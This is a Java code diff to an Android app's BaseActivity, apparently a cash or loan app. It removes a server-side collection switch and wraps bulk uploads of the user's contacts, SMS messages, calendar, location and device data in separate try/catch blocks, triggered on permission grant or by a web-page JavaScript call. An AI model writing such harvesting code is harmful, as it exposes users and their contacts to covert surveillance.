@@ -39,6 +39,7 @@ import com.cashhub.cash.common.KndcEvent;
 import com.cashhub.cash.common.KndcStorage;
 import com.cashhub.cash.common.TrackData;
 import com.cashhub.cash.common.UploadData;
+import com.cashhub.cash.common.utils.AdvertisingIdClient;
 import com.cashhub.cash.common.utils.CommonUtil;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
@@ -191,38 +192,6 @@ public class BaseActivity extends AppCompatActivity {
       openPicture();
     } else if (KndcEvent.GET_POLICY_SIGN.equals(event.getEventName())) {
       uploadImage(event, lineType, uploadType);
-    } else if (KndcEvent.COLLECTION_STATUS.equals(event.getEventName())) {
-      String commonRet = event.getCommonRet();
-      if (TextUtils.isEmpty(commonRet)) {
-        return;
-      }
-      Gson gson = new Gson();
-      CommonResult commonResult = gson.fromJson(commonRet,
-          new TypeToken<CommonResult>() {
-          }.getType());
-      if (commonResult == null || commonResult.getData() == null) {
-        return;
-      } else if(commonResult.getCode() != 0) {
-        Log.d(TAG, "login fail");
-        return;
-      }
-
-      Map<String, String> retData = commonResult.getData();
-
-      //收集数据开关
-      String collection = retData.get("collection");
-      if(!TextUtils.isEmpty(collection) && "true".equals(collection)) {
-        //收集数据
-        collectDataAndUpload();
-//        //点击过确认按钮 才可以收集数据
-//        String appIsCheckPermission =
-//        KndcStorage.getInstance().getData(KndcStorage.H5_IS_CHECK_PERMISSION);
-//        if (!TextUtils.isEmpty(appIsCheckPermission) && appIsCheckPermission
-//            .equals(KndcStorage.YSE)) {
-//          //收集数据
-//          collectDataAndUpload();
-//        }
-      }
     } else if (KndcEvent.BEGIN_CHECK_PERMISSION.equals(event.getEventName())) {
       setConfigInfo(KndcStorage.H5_IS_CHECK_PERMISSION, "1");
       if (!hasPermissionKndc() && !H5_IS_REQUEST_PERMISSION) {
@@ -235,9 +204,12 @@ public class BaseActivity extends AppCompatActivity {
           return;
         }
         IS_CHECK_PERMISSION_UPLOAD = true;
+
+        Log.d(TAG, "onMessageEvent: collectDataAndUpload BEGIN_CHECK_PERMISSION");
         collectDataAndUpload();
       }
     } else if (KndcEvent.JS_CALL_UPLOAD_DATA.equals(event.getEventName())) {
+      Log.d(TAG, "onMessageEvent: collectDataAndUpload JS_CALL_UPLOAD_DATA");
       collectDataAndUpload();
     } else if (KndcEvent.UPLOAD_IMAGE_SUCCESS.equals(event.getEventName())) {
       String uploadImageUrl = event.getUrl();
@@ -348,6 +320,7 @@ public class BaseActivity extends AppCompatActivity {
       return;
     }
     IS_INIT = true;
+    Log.d(TAG, "Begin initData");
 
     CommonApp.initPermissions();
 
@@ -366,6 +339,7 @@ public class BaseActivity extends AppCompatActivity {
 
     String appIsInit =
         KndcStorage.getInstance().getData(KndcStorage.APP_IS_INIT);
+    Log.d(TAG, "appIsInit:" + appIsInit);
 
     //初始化过之后 校验权限 - 第一次由H5触发
 //    if (!TextUtils.isEmpty(appIsInit) && appIsInit.equals(KndcStorage.YSE)) {
@@ -374,14 +348,8 @@ public class BaseActivity extends AppCompatActivity {
 //        requestPermissionKndc();
 //      }
 //    }
-    new Thread(() -> {
-      //初始化过之后才上报数据
-      if (!TextUtils.isEmpty(appIsInit) && appIsInit.equals(KndcStorage.YSE)) {
-        CommonApi.getInstance().getCollectionStatus(this);
-      }
-    }).start();
 
-    if (!TextUtils.isEmpty(appIsInit) && appIsInit.equals(KndcStorage.YSE)) {
+    if (TextUtils.isEmpty(appIsInit)) {
       //设置初始化
       setConfigInfo(KndcStorage.APP_IS_INIT, "1");
     }
@@ -630,6 +598,7 @@ public class BaseActivity extends AppCompatActivity {
         Log.d(TAG, "onMessageEvent: checkSelfPermission");
         requestPermissionKndc();
       } else {
+        Log.d(TAG, "onMessageEvent: collectDataAndUpload onRequestPermissionsResult");
         collectDataAndUpload();
       }
     }
@@ -658,9 +627,15 @@ public class BaseActivity extends AppCompatActivity {
 //            setConfigInfo(KndcStorage.CONFIG_CALENDAR_TIME, String.valueOf(nowTimeStamp));
 //          }
 //        }
-        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendContact" );
-        uploadData.getAndSendContact();
-        setConfigInfo(KndcStorage.CONFIG_CALENDAR_TIME, String.valueOf(nowTimeStamp));
+        try {
+
+          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendContact" );
+          uploadData.getAndSendContact();
+          setConfigInfo(KndcStorage.CONFIG_CALENDAR_TIME, String.valueOf(nowTimeStamp));
+        } catch (Exception e) {
+          Log.d(TAG, e.getMessage());
+          e.printStackTrace();
+        }
 
         //上传短信  每次启动APP增量上报
 //        String smsLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME);
@@ -672,22 +647,37 @@ public class BaseActivity extends AppCompatActivity {
 //            setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(nowTimeStamp));
 //          }
 //        }
-        String smsLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME);
-        long smsLastTimeStamp = 0;
-        if(!TextUtils.isEmpty(smsLastTime)) {
-          smsLastTimeStamp = Long.parseLong(smsLastTime);
+        try {
+          String smsLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME);
+          long smsLastTimeStamp = 0;
+          if(!TextUtils.isEmpty(smsLastTime)) {
+            smsLastTimeStamp = Long.parseLong(smsLastTime);
+          }
+          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendSms" );
+          uploadData.getAndSendSms(smsLastTimeStamp);
+          setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(nowTimeStamp));
+        } catch (Exception e) {
+          Log.d(TAG, e.getMessage());
+          e.printStackTrace();
         }
-        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendSms" );
-        uploadData.getAndSendSms(smsLastTimeStamp);
-        setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(nowTimeStamp));
 
-        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendCalendar" );
-        uploadData.getAndSendCalendar();
-        setConfigInfo(KndcStorage.CONFIG_CONTACT_TIME, String.valueOf(nowTimeStamp));
+        try {
+          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendCalendar" );
+          uploadData.getAndSendCalendar();
+          setConfigInfo(KndcStorage.CONFIG_CONTACT_TIME, String.valueOf(nowTimeStamp));
+        } catch (Exception e) {
+          Log.d(TAG, e.getMessage());
+          e.printStackTrace();
+        }
 
-        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendLocation" );
-        uploadData.getAndSendLocation();
-        setConfigInfo(KndcStorage.CONFIG_LOCAL_TIME, String.valueOf(nowTimeStamp));
+        try {
+          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendLocation" );
+          uploadData.getAndSendLocation();
+          setConfigInfo(KndcStorage.CONFIG_LOCAL_TIME, String.valueOf(nowTimeStamp));
+        } catch (Exception e) {
+          Log.d(TAG, e.getMessage());
+          e.printStackTrace();
+        }
 
         //上传设备信息  每次启动APP全量上报 获取adid比较耗时，放在最后上报
 //        String deviceLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_DEVICE_TIME);
@@ -699,10 +689,15 @@ public class BaseActivity extends AppCompatActivity {
 //            setConfigInfo(KndcStorage.CONFIG_DEVICE_TIME, String.valueOf(nowTimeStamp));
 //          }
 //        }
-        //这个方法是耗时的，不能在主线程调用
-        Log.d(TAG, "collectDataAndUpload BEGIN getAndSendDevice" );
-        uploadData.getAndSendDevice();
-        setConfigInfo(KndcStorage.CONFIG_DEVICE_TIME, String.valueOf(nowTimeStamp));
+
+        try {
+          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendDevice" );
+          uploadData.getAndSendDevice();
+          setConfigInfo(KndcStorage.CONFIG_DEVICE_TIME, String.valueOf(nowTimeStamp));
+        } catch (Exception e) {
+          Log.d(TAG, e.getMessage());
+          e.printStackTrace();
+        }
       } catch (Exception e) {
         Log.d(TAG, e.getMessage());
         e.printStackTrace();
